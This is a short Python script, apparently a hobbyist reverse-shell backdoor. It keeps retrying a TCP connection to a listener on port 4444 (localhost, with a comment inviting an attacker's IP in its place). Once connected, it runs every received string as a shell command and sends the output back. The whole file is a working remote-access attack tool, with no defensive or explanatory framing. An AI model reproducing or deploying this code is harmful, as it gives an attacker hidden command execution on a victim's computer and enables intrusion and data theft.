import socket
import subprocess
import os
import struct

def send_msg(socks, msg):
    packed_msg = struct.pack(">I", len(msg)) + msg
    socks.sendall(packed_msg)

def recv_msg(socks):
    raw_msg = recvall(socks, 4)
    if not raw_msg:
        return None
    msglen = struct.unpack(">I", raw_msg)[0]
    val = recvall(socks, msglen)
    return val
    
def recvall(sock,n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data
def connect():
    global s
    while 1:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #tcp socket
            s.connect(("127.0.0.1", 4444)) # 127.0.0.1 is localhost or current connected network
             # 127.0.0.1 can be replaced by haxxors ip
            break
        except socket.error:
            pass
    while 1:
        try:
            recv = recv_msg(s)
            if recv[:2].decode("utf-8") == "cd":
                send_msg(s,bytearray(str(os.getcwd()), "utf-8"))
            if len(recv.decode("utf-8")) > 0:
                process = subprocess.Popen(recv.decode("utf-8"),
                                       shell=True,
                                       stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
                output_bytes, err = process.communicate()
                outputbytes = bytearray(str(output_bytes), "utf-8")
                send_msg(s,outputbytes)
        except socket.error:
            s.close()
            print("Error Trying Again....")
            connect()
        except AttributeError:
            s.close()
            print("Error Trying Again....")
            connect()
        except TypeError:
            s.close()
            print("Error Trying Again....")
            connect()
connect()
